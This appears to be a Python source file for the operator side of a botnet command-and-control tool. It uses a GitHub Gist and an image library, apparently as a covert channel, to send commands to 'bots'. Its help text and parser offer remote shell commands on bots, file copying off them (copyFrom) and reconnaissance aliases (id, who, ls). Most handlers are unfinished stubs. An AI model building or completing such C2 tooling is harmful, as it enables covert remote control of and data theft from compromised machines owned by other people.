import argparse
import os
import select
import shutil
import sys
from typing import Optional

from git import GithubGistClient

# from time import sleep
# import subprocess

IMAGES_LIBRARY = '4c7fe7e6d06b0b90ab4848b234209e95'
CONTROL_IMAGE = 'security.jpg'
UPDATE_INTERVAL = 30  # seconds
KEEP_ALIVE_TIMEOUT = 90  # seconds


class Controller:

    def __init__(
        self,
        workdir: str,
        gist: str,
        token: str,
        recreate_workdir: bool = False,
        skip_init_reset: bool = False,
        skip_init_pull: bool = False,
    ) -> None:
        self._workdir = os.path.abspath(workdir)
        self._gist = gist
        self._token = token
        self._recreate_workdir = recreate_workdir
        self._skip_init_reset = skip_init_reset
        self._skip_init_pull = skip_init_pull

        self._lib_dir = os.path.join(self._workdir, 'lib')
        self._lib_client = GithubGistClient(
            gist=IMAGES_LIBRARY,
            repo_dir=self._lib_dir,
        )

        self._comm_dir = os.path.join(self._workdir, 'comm')
        self._comm_client = GithubGistClient(
            gist=self._gist,
            token=self._token,
            repo_dir=self._comm_dir,
        )

    def _create_commands_parser(self) -> None:
        self._parser = argparse.ArgumentParser()
        self._parser.add_argument(
            'workdir',
            help='work directory where the files and directories created by the controller will be put'
        )
        self._parser.add_argument('gist', help='ID of the GitHub Gist for communication with bots')
        self._parser.add_argument('token', help='GitHub Personal access token (classic) with (at least) gist scope')
        return

    def _ensure_workdir(self) -> None:
        if os.path.isdir(self._workdir) and self._recreate_workdir:
            print(f'removing and re-creating workdir {self._workdir}...')
            shutil.rmtree(self._workdir)
        if not os.path.isdir(self._workdir):
            os.makedirs(self._workdir)
        print(f'workdir ready')

    def _load_lib_images(self):
        self._lib_images = set(filter(
            lambda f: f.endswith('.png') or f.endswith('.jpg'),
            os.listdir(self._lib_dir),
        ))
        print(f'library contains {len(self._lib_images)} images:')
        for img in self._lib_images:
            print(f'  {img}')
        if CONTROL_IMAGE not in self._lib_images:
            raise RuntimeError(f'Control image {CONTROL_IMAGE} is not the library!')

    def _setup(self) -> None:
        self._ensure_workdir()

        print('initializing images library to...')
        self._lib_client.init(
            skip_reset=self._skip_init_reset,
            skip_pull=self._skip_init_pull,
        )
        self._load_lib_images()

        print(f'initializing the gist from {self._comm_client.get_https_url(with_token=False)} to {self._comm_dir} ...')
        self._comm_client.init(
            skip_reset=self._skip_init_reset,
            skip_pull=self._skip_init_pull,
        )

        self._bots = {}

        self._create_commands_parser()

        pass

    def update_state(self) -> None:
        print('updating bots state ...')
        self._comm_client.pull_changes()
        # TODO
        pass

    @staticmethod
    def print_help() -> None:
        print(
            '\nAvailable commands:\n\n'
            'Use Ctrl-C to stop and exit the controller.\n\n'
            'help\n'
            '  Prints this help.\n'
            'bots\n'
            '  Lists all bots and their status.\n'
            'terminate <bot>\n'
            '  Terminates the bot.\n'
            'shell <bot> <command>\n'
            '  Runs the given command on the bot using the following Python code.\n'
            '    subprocess.run(args=[<command>], shell=True)\n'
            '  Note: <command> might contain spaces. Even the leading/trailing spaces are preserved.\n'
            '  See https://docs.python.org/3.8/library/subprocess.html#subprocess.run.\n'
            'run <bot> <command>\n'
            '  Runs the given command on the bot using the following Python code.\n'
            '    subprocess.run(args=shlex.split(<command>), shell=False)\n'
            '  Note: <command> might contain spaces. Even the leading/trailing spaces are preserved.\n'
            '  See https://docs.python.org/3.8/library/subprocess.html#subprocess.run.\n'
            'copyFrom <bot> <file name>\n'
            'do <bot> id\n'
            '  Alias for shell <bot> id\n'
            'do <bot> who\n'
            '  Alias for shell <bot> who\n'
            'do <bot> ls <path>\n'
            '  Alias for shell <bot> ls -lha\n'
        )

    def print_bots(self) -> None:
        print('Bots:')
        pass

    def is_valid_bot(self, bot: str) -> bool:
        return True

    def process_terminate_command(self, bot) -> None:
        pass

    def process_run_command(self, bot, shell: bool, cmd: Optional[str]) -> None:
        if cmd is None:
            print('Missing <command> argument!')
            return
        if cmd == '':
            print('Invalid empty <command> argument!')
            return
        pass

    def process_copy_from_command(self, bot, file_name: Optional[str]) -> None:
        if file_name is None:
            print('Missing <file name> argument!')
            return
        if file_name == '':
            print('Invalid empty <file name> argument!')
            return
        pass

    def process_do_command(self, bot, action: Optional[str]) -> None:
        if action is None:
            print('Missing do action!')
            return
        if action == 'id':
            self.process_run_command(bot, shell=True, cmd='id')
            return
        if action == 'who':
            self.process_run_command(bot, shell=True, cmd='who')
            return
        if action.startswith('ls '):
            path = action[3:]
            if path == '':
                print(f"Invalid path '{path}'!")
                return
            self.process_run_command(bot, shell=True, cmd='ls -lha ' + path)
            return
        print(f"Invalid do action '{action}'!")
        return

    def process_command(self, cmd_str) -> None:
        if cmd_str == '':
            # no command
            return

        parts = cmd_str.split(sep=' ', maxsplit=1)
        cmd_name = parts[0]

        if cmd_name == 'help' or cmd_name == '?':
            self.print_help()
            return

        if cmd_name == 'bots':
            self.print_bots()
            return

        # all other commands should have format <cmd_name> <bot> <...the rest>
        if len(parts) == 2:
            sub_parts = parts[1].split(sep=' ', maxsplit=1)
            bot = sub_parts[0]
            args_str = sub_parts[1] if len(sub_parts) == 2 else None
            if not self.is_valid_bot(bot):
                print(f"Command '{cmd_str}'")
                print(f"Invalid bot '{bot}' given.")
                return

            if cmd_name == 'terminate':
                self.process_terminate_command(bot)
                return
            if cmd_name == 'shell':
                self.process_run_command(bot, shell=True, cmd=args_str)
                return
            if cmd_name == 'run':
                self.process_run_command(bot, shell=False, cmd=args_str)
                return
            if cmd_name == 'copyFrom':
                self.process_copy_from_command(bot, file_name=args_str)
                return
            if cmd_name == 'do':
                self.process_do_command(bot, action=args_str)
                return

        print(f"Invalid or unknown command '{cmd_str}'!")
        print(f'Type ? or help to show help.')

    def run(self) -> None:
        self._setup()

        while True:
            print(
                '\nEnter a command. Use ? or help to show help.\n'
                f'Auto update in {UPDATE_INTERVAL} seconds. Press enter to force update.\n'
                '> ',
                end='',
            )
            ready_read, _, _ = select.select([sys.stdin], [], [], UPDATE_INTERVAL)
            if len(ready_read) == 1:
                # do not remove trailing whitespace except newline chars
                cmd_str = sys.stdin.readline().lstrip().rstrip('\r\n')
                self.process_command(cmd_str)
            else:
                # so we do not write to the prompt line
                # note: we could also use ASCII ESC sequences to clear the prompt (and add colors as well)
                print('')
            self.update_state()

        pass

    @staticmethod
    def stop() -> None:
        print('Stopping the controller. Note that the bots might still be running.')
        print('Use terminate command to stop a specific bot.')

    pass


if __name__ == '__main__':
    _parser = argparse.ArgumentParser()
    _parser.add_argument(
        'workdir',
        help='work directory where the files and directories created by the controller will be put',
    )
    _parser.add_argument(
        'gist',
        help='ID of the GitHub Gist for communication with bots',
    )
    _parser.add_argument(
        'token',
        help='GitHub Personal access token (classic) with (at least) gist scope',
    )
    _parser.add_argument(
        '--recreate',
        action='store_true',
        help='Remove and recreate the workdir even if it already exists',
    )
    _parser.add_argument(
        '--skip-init-reset',
        action='store_true',
        help='Skip resetting the git repos if they already exist.',
    )
    _parser.add_argument(
        '--skip-init-pull',
        action='store_true',
        help='Skip updating the git repos if they already exist.',
    )
    _parser.add_argument(
        '--fast-init',
        action='store_true',
        help='Shortcut for combination of of --skip-init-reset and --skip-init-pull.',
    )
    _args = _parser.parse_args()
    _controller = Controller(
        workdir=_args.workdir,
        gist=_args.gist,
        token=_args.token,
        recreate_workdir=_args.recreate,
        skip_init_reset=_args.fast_init or _args.skip_init_reset,
        skip_init_pull=_args.fast_init or _args.skip_init_pull,
    )
    try:
        _controller.run()
    except KeyboardInterrupt:
        _controller.stop()
